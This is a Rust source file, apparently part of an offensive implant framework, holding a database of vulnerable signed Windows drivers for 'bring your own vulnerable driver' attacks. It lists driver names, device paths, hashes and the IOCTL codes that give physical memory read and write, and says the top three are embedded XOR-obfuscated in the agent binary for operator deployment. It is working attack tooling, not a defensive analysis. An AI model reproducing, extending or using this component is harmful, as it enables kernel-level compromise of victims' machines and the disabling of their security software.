//! Vulnerable signed driver database for BYOVD operations.
//!
//! Contains a static registry of known vulnerable signed drivers that can be
//! used for physical memory read/write.  Each entry includes the driver name,
//! expected SHA-256 hash for integrity verification, exported function names
//! for physical memory access, and the mapping type.
//!
//! Only the top 3 most-reliable drivers are embedded in the agent binary
//! (XOR-obfuscated at rest).  The remaining entries are kept for reference
//! and for future expansion.

use serde::{Deserialize, Serialize};

/// How a vulnerable driver exposes physical memory access.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DriverMapping {
    /// Direct physical memory read/write via IOCTL.
    PhysicalMemory,
    /// Memory-mapped I/O region.
    MmioMapping,
    /// Port I/O based access.
    PortIo,
}

/// A known vulnerable signed driver entry.
#[derive(Debug, Clone)]
pub struct VulnerableDriver {
    /// Short driver filename, e.g. "DBUtil_2_3.sys".
    pub name: &'static str,
    /// Device name the driver creates (e.g. "DBUtil_2_3", "RTCore64").
    /// Used to construct the NT device path "\\??\\<device_name>" for
    /// opening a handle via NtOpenFile.
    pub device_name: &'static str,
    /// Expected SHA-256 hash for integrity verification.
    pub sha256: &'static str,
    /// Exported function name for physical memory read.
    pub read_phys_fn: &'static str,
    /// Exported function name for physical memory write.
    pub write_phys_fn: &'static str,
    /// How the driver exposes physical memory.
    pub mapping_type: DriverMapping,
    /// IOCTL code for reading physical memory (if applicable).
    pub read_ioctl: u32,
    /// IOCTL code for writing physical memory (if applicable).
    pub write_ioctl: u32,
    /// Whether the driver requires a *physical* address rather than a
    /// virtual one.
    ///
    /// When `false` (the common case), the driver accepts a virtual address
    /// and internally converts it — either via `MmMapIoSpace` (rtcore64,
    /// gdrv, procexp152, etc.) or via `MmGetPhysicalAddress` +
    /// `MmCopyVirtualMemory` (DBUtil_2_3.sys).  The caller should always
    /// supply a **virtual** address.
    ///
    /// When `true`, the driver's IOCTL handler passes the supplied value
    /// straight to `MmMapIoSpace` without any conversion, so the caller
    /// must supply a physical address.  No driver in the current database
    /// uses this mode.
    pub needs_physical_addr: bool,
}

/// The static database of known vulnerable signed drivers.
///
/// Architecture-gated: x86-64 and AArch64 have different driver binaries.
/// On x86-64, the database contains the well-known vulnerable drivers
/// (Dell, MSI, Gigabyte, etc.). On AArch64, the database is currently
/// empty because ARM64 Windows does not yet have widely-documented
/// vulnerable signed drivers available in public threat-intelligence
/// databases.
///
/// ARM64 Windows BYOVD status (2025):
/// - ARM64 Windows can only load ARM64-compiled kernel drivers.
/// - Most publicly-known vulnerable drivers (DBUtil_2_3.sys, rtcore64.sys,
///   gdrv.sys, etc.) are x86-64 only — they will not load on ARM64.
/// - ARM64-specific vulnerable drivers may emerge as the platform grows.
///   Candidates include Qualcomm/Snapdragon driver packages, IoT/edge
///   device drivers, and vendor-supplied firmware update utilities.
/// - When an ARM64-compatible vulnerable driver is identified and verified,
///   add it to the `AArch64` section below.
///
/// The deploy pipeline will gracefully degrade: if no driver is found in
/// the database, it returns an error suggesting manual driver deployment.
#[cfg(target_arch = "x86_64")]
pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
    // ── Tier 1: Embedded in agent binary ──────────────────────────────

    // DBUtil_2_3.sys — Dell BIOS utility driver (CVE-2021-21551).
    // The IOCTL handler calls MmGetPhysicalAddress on the supplied value
    // and then uses MmCopyVirtualMemory on the result, so the caller must
    // supply a VIRTUAL address — the driver does the VA→PA conversion
    // internally.
    VulnerableDriver {
        name: "DBUtil_2_3.sys",
        device_name: "DBUtil_2_3",
        sha256: "0296e2ce999e67c76352613a718e11516fe1b0efc3ffdb8918fc999dd76a73a5",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x222064,
        write_ioctl: 0x222068,
        needs_physical_addr: false,
    },
    // rtcore64.sys — Micro-Star MSI Afterburner / RivaTuner driver.
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    VulnerableDriver {
        name: "rtcore64.sys",
        device_name: "RTCore64",
        sha256: "01aa278b07b58dc46c84bd0b1b5c8e9ee4e62ea0bf7a695862444af32e87f1fd",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80002048,
        write_ioctl: 0x8000204C,
        needs_physical_addr: false,
    },
    // gdrv.sys — Giga-BYTE NonPnP Driver (GIO).
    // Uses MmMapIoSpace internally, so virtual addresses work fine.
    VulnerableDriver {
        name: "gdrv.sys",
        device_name: "GIO",
        sha256: "092d04284fdeb6762e65e6ac5b813920d6c69a5e99d110769c5c1a78e11c5ba0",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9E3AEC18,
        write_ioctl: 0x9E3AEC1C,
        needs_physical_addr: false,
    },
    // ── Tier 2: Reference only (not embedded) ─────────────────────────

    // ene.sys — ENE Technology driver.
    VulnerableDriver {
        name: "ene.sys",
        device_name: "ENE",
        sha256: "16768203a471a19ebb541c942f45716e9f432985abbfbe6b4b7d61a798cea354",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x8020E000,
        write_ioctl: 0x8020E004,
        needs_physical_addr: false,
    },
    // procexp152.sys — Process Explorer driver (Sysinternals).
    // Uses MmMapIoSpace + MmGetPhysicalAddress internally.
    VulnerableDriver {
        name: "procexp152.sys",
        device_name: "PROCEXP152",
        sha256: "075de997497262a9d105afeadaaefc6348b25ce0e0126505c24aa9396c251e85",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x6D008,
        write_ioctl: 0x6D00C,
        needs_physical_addr: false,
    },
    // cpuz141.sys — CPUID CPU-Z hardware profiler v1.41.
    VulnerableDriver {
        name: "cpuz141.sys",
        device_name: "cpuz141",
        sha256: "ded2927f9a4e64eefd09d0caba78e94f309e3a6292841ae81d5528cab109f95d",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x9C402580,
        write_ioctl: 0x9C402584,
        needs_physical_addr: false,
    },
    // MsIo64.sys — MICSYS hardware utility driver (MSI motherboard tooling).
    VulnerableDriver {
        name: "MsIo64.sys",
        device_name: "MsIo64",
        sha256: "0f035948848432bc243704041739e49b528f35c82a5be922d9e3b8a4c44398ff",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::PhysicalMemory,
        read_ioctl: 0x80102040,
        write_ioctl: 0x80102044,
        needs_physical_addr: false,
    },
    // iQVW64.SYS — Intel Network Adapter Diagnostic Driver.
    VulnerableDriver {
        name: "iQVW64.SYS",
        device_name: "IQVW64e",
        sha256: "19bf0d0f55d2ad33ef2d105520bde8fb4286f00e9d7a721e3c9587b9408a0775",
        read_phys_fn: "DeviceIoControl",
        write_phys_fn: "DeviceIoControl",
        mapping_type: DriverMapping::MmioMapping,
        read_ioctl: 0x80862008,
        write_ioctl: 0x80862008,
        needs_physical_addr: false,
    },
];

/// ARM64 driver database — currently empty.
///
/// ARM64 Windows requires ARM64-compiled kernel drivers.  The well-known
/// BYOVD drivers (DBUtil_2_3, rtcore64, gdrv, etc.) are x86-64 only and
/// will not load on ARM64 Windows.
///
/// To add ARM64 drivers:
/// 1. Identify an ARM64-compiled signed driver with physical memory R/W.
/// 2. Verify the SHA-256 hash against a trusted source (LOLDrivers, VirusTotal).
/// 3. Document the IOCTL codes and mapping type.
/// 4. Add a `VulnerableDriver` entry below.
/// 5. Update `EMBEDDED_DRIVER_INDICES` if the driver should be embedded.
#[cfg(target_arch = "aarch64")]
pub static DRIVER_DATABASE: &[VulnerableDriver] = &[
    // ARM64-specific vulnerable drivers would go here.
    // As of 2025, no widely-documented ARM64-compatible vulnerable signed
    // drivers exist in public threat-intelligence databases.
    //
    // Potential candidates to monitor:
    // - Qualcomm Snapdragon driver packages (firmware update utilities)
    // - ARM64 IoT/edge device drivers (vendor-supplied)
    // - ARM64 builds of existing tools (Process Explorer, CPU-Z) if they
    //   ship ARM64 kernel drivers with the same vulnerable IOCTL patterns
    //
    // The deploy pipeline will return a clear error message when no driver
    // is available, allowing operator-assisted manual deployment.
];

/// Index into DRIVER_DATABASE for the embedded drivers (top 3).
/// These are XOR-obfuscated with the agent's HKDF session key and embedded
/// via `include_bytes!` in the parent module.
///
/// On ARM64, there are no embedded drivers (database is empty).
#[cfg(target_arch = "x86_64")]
pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[0, 1, 2];

/// ARM64: no embedded drivers available.
#[cfg(target_arch = "aarch64")]
pub const EMBEDDED_DRIVER_INDICES: &[usize] = &[];

/// Find a driver by name (case-insensitive).
pub fn find_driver(name: &str) -> Option<&'static VulnerableDriver> {
    DRIVER_DATABASE
        .iter()
        .find(|d| d.name.eq_ignore_ascii_case(name))
}

/// Return the list of embedded driver entries.
pub fn embedded_drivers() -> Vec<&'static VulnerableDriver> {
    EMBEDDED_DRIVER_INDICES
        .iter()
        .filter_map(|&i| DRIVER_DATABASE.get(i))
        .collect()
}

/// Return all driver names in the database.
pub fn all_driver_names() -> Vec<&'static str> {
    DRIVER_DATABASE.iter().map(|d| d.name).collect()
}
